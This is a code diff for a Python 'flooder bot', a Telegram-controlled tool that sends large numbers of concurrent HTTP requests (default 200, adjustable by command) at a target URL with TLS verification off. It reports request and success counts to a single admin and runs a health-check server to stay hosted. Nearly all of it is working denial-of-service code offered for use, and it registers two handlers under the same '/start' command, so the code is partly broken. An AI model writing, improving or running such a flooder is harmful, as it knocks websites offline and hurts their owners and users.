@@ -1,18 +1,17 @@
 #!/usr/bin/env python3
 """
-🔥 FLOODER BOT – Full Working with Telegram Control
+🔥 SIMPLE FLOODER BOT – Sirf Commands, 100% Working
 """
 import asyncio
 import aiohttp
-import os
 import logging
-import sys
-from itertools import cycle
+import os
 from datetime import datetime
 from aiohttp import web
+from itertools import cycle
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
 
 # ─── LOGGING ──────────────────────────────────────────────
 logging.basicConfig(level=logging.INFO)
@@ -37,48 +36,29 @@ HEADERS = {
 total_requests = 0
 successful_requests = 0
 failed_requests = 0
-status_counts = {}
 running = False
 flooder_task = None
 CONCURRENT_LIMIT = 200
 
 # ─── FETCH FUNCTION ────────────────────────────────────
 async def fetch_one(session, url, semaphore, index):
-    global total_requests, successful_requests, failed_requests, status_counts
+    global total_requests, successful_requests, failed_requests
     
     async with semaphore:
-        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
         try:
             async with session.get(url, headers=HEADERS, ssl=False, timeout=15) as resp:
                 status = resp.status
-                body = await resp.text()
-                clean_body = body.replace("\n", " ").strip()
-                
                 total_requests += 1
                 if status == 200:
                     successful_requests += 1
                 else:
                     failed_requests += 1
-                
-                status_counts[status] = status_counts.get(status, 0) + 1
-                
-                if index % 10 == 0:
+                if index % 50 == 0:
                     logger.info(f"Req #{index} → {status}")
-                
                 return status
-                
-        except asyncio.TimeoutError:
+        except:
             total_requests += 1
             failed_requests += 1
-            status_counts['TIMEOUT'] = status_counts.get('TIMEOUT', 0) + 1
-            logger.info(f"Req #{index} → TIMEOUT")
-            return None
-            
-        except Exception as e:
-            total_requests += 1
-            failed_requests += 1
-            status_counts['ERROR'] = status_counts.get('ERROR', 0) + 1
-            logger.error(f"Req #{index} → ERROR: {str(e)[:50]}")
             return None
 
 # ─── FLOODER ────────────────────────────────────────────
@@ -112,35 +92,32 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("⛔ Unauthorized.")
         return
-    keyboard = [
-        [InlineKeyboardButton("📊 Status", callback_data="status")],
-        [InlineKeyboardButton("▶️ Start", callback_data="startflood")],
-        [InlineKeyboardButton("⏹️ Stop", callback_data="stopflood")],
-        [InlineKeyboardButton("⚡ Speed", callback_data="setspeed")],
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
         "🔥 **FLOODER BOT**\n"
-        f"⚡ Speed: {CONCURRENT_LIMIT}\n"
-        f"🔄 Status: {'✅ Running' if running else '❌ Stopped'}\n\n"
-        "Use buttons:",
-        reply_markup=reply_markup
+        "/status – Live stats\n"
+        "/start – Start flood\n"
+        "/stop – Stop flood\n"
+        "/speed <num> – Set concurrent"
     )
 
 async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
     global total_requests, successful_requests, failed_requests
-    msg = (f"📊 **STATUS**\n"
-           f"📤 Total: {total_requests:,}\n"
-           f"✅ Success: {successful_requests:,}\n"
-           f"❌ Failed: {failed_requests:,}\n"
-           f"📈 Rate: {successful_requests/(total_requests or 1)*100:.1f}%\n"
-           f"🔄 Running: {'✅ Yes' if running else '❌ No'}")
+    rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
+    msg = (
+        f"📊 **STATUS**\n"
+        f"📤 Total: {total_requests:,}\n"
+        f"✅ Success: {successful_requests:,}\n"
+        f"❌ Failed: {failed_requests:,}\n"
+        f"📈 Rate: {rate:.1f}%\n"
+        f"🔄 Running: {'✅ Yes' if running else '❌ No'}\n"
+        f"⚡ Speed: {CONCURRENT_LIMIT}"
+    )
     await update.message.reply_text(msg)
 
-async def start_flooder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global running, flooder_task, total_requests, successful_requests, failed_requests, status_counts
+async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global running, flooder_task, total_requests, successful_requests, failed_requests
     if update.effective_user.id != ADMIN_ID:
         return
     if running:
@@ -149,12 +126,11 @@ async def start_flooder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     total_requests = 0
     successful_requests = 0
     failed_requests = 0
-    status_counts = {}
     running = True
     flooder_task = asyncio.create_task(flooder_loop())
     await update.message.reply_text("▶️ Flooder started!")
 
-async def stop_flooder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def stop_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global running
     if update.effective_user.id != ADMIN_ID:
         return
@@ -166,7 +142,7 @@ async def stop_flooder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         flooder_task.cancel()
     await update.message.reply_text("🛑 Flooder stopped!")
 
-async def set_speed_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def set_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global CONCURRENT_LIMIT
     if update.effective_user.id != ADMIN_ID:
         return
@@ -177,34 +153,20 @@ async def set_speed_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         CONCURRENT_LIMIT = val
         await update.message.reply_text(f"⚡ Speed set to {val}")
     except:
-        await update.message.reply_text("❌ Usage: /setspeed <number>")
-
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if query.data == "status":
-        await status_cmd(update, context)
-    elif query.data == "startflood":
-        await start_flooder_cmd(update, context)
-    elif query.data == "stopflood":
-        await stop_flooder_cmd(update, context)
-    elif query.data == "setspeed":
-        await query.edit_message_text("⚡ Send /setspeed <number>")
+        await update.message.reply_text("❌ Usage: /speed <number>")
 
 # ─── HEALTH CHECK ──────────────────────────────────────────
 async def health(request):
-    return web.Response(text="✅ Flooder is online", status=200)
+    return web.Response(text="✅ Bot is online", status=200)
 
 async def run_webserver():
     app = web.Application()
     app.router.add_get('/', health)
-    app.router.add_get('/health', health)
     runner = web.AppRunner(app)
     await runner.setup()
     port = int(os.getenv("PORT", "8080"))
     site = web.TCPSite(runner, host='0.0.0.0', port=port)
     await site.start()
-    logger.info("🌐 Web server started")
     await asyncio.Event().wait()
 
 # ─── MAIN ──────────────────────────────────────────────────
@@ -212,16 +174,11 @@ async def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start_cmd))
     app.add_handler(CommandHandler("status", status_cmd))
-    app.add_handler(CommandHandler("startflood", start_flooder_cmd))
-    app.add_handler(CommandHandler("stopflood", stop_flooder_cmd))
-    app.add_handler(CommandHandler("setspeed", set_speed_cmd))
-    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(CommandHandler("start", start_flooder))
+    app.add_handler(CommandHandler("stop", stop_flooder))
+    app.add_handler(CommandHandler("speed", set_speed))
     
-    # Startup message
-    try:
-        await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Bot Online**\n/start")
-    except:
-        logger.warning("Could not send startup message, bot will still work")
+    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 Bot Online")
     
     await app.initialize()
     await app.start()
